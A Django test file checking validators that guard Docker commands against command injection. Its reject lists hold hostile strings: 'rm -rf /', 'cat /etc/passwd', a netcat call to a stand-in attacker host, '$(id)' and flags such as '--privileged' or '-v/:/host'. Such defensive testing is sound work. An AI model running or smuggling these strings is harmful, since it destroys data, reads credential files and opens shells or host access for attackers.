from django.test import TestCase

from .utility import is_safe_container_id, is_safe_docker_image, normalize_port

# Create your tests here.


class IsSafeContainerIdTests(TestCase):
    """Regression tests for the container id allowlist used before `docker stop`."""

    def test_accepts_short_and_full_container_ids(self):
        self.assertTrue(is_safe_container_id("a1b2c3d4e5f6"))
        self.assertTrue(is_safe_container_id("0" * 64))

    def test_rejects_shell_metacharacters(self):
        for value in [
            "abc123abc123; rm -rf /",
            "abc123abc123 && cat /etc/passwd",
            "abc123abc123 | nc attacker 4444",
            "$(id)",
            "`id`",
            "abc123abc123\nrm -rf /",
            "--rm",
        ]:
            self.assertFalse(is_safe_container_id(value), value)

    def test_rejects_empty_short_and_non_string_values(self):
        self.assertFalse(is_safe_container_id(""))
        self.assertFalse(is_safe_container_id("abc"))
        self.assertFalse(is_safe_container_id("z" * 12))
        self.assertFalse(is_safe_container_id(None))


class IsSafeDockerImageTests(TestCase):
    """Regression tests for the image allowlist used before `docker run`."""

    def test_accepts_common_image_references(self):
        for value in [
            "nginx",
            "nginx:1.25-alpine",
            "pygoat/lab:latest",
            "registry.example.com:5000/org/lab:v2",
            "org/lab@sha256:" + "0" * 64,
        ]:
            self.assertTrue(is_safe_docker_image(value), value)

    def test_rejects_shell_metacharacters_and_option_flags(self):
        for value in [
            "nginx; rm -rf /",
            "nginx && cat /etc/passwd",
            "nginx | nc attacker 4444",
            "$(id)",
            "`id`",
            "nginx\nrm -rf /",
            "nginx latest",
            "--privileged",
            "-v/:/host",
        ]:
            self.assertFalse(is_safe_docker_image(value), value)

    def test_rejects_empty_and_non_string_values(self):
        self.assertFalse(is_safe_docker_image(""))
        self.assertFalse(is_safe_docker_image(None))
        self.assertFalse(is_safe_docker_image(8080))


class NormalizePortTests(TestCase):
    """Regression tests for the port coercion used in the `-p` argument."""

    def test_accepts_ports_in_range(self):
        self.assertEqual(normalize_port(1), 1)
        self.assertEqual(normalize_port(8080), 8080)
        self.assertEqual(normalize_port("8080"), 8080)
        self.assertEqual(normalize_port(65535), 65535)

    def test_rejects_out_of_range_and_non_numeric_values(self):
        for value in [0, -1, 65536, None, True, "", "80 -v /:/host", "80;id"]:
            self.assertIsNone(normalize_port(value), value)
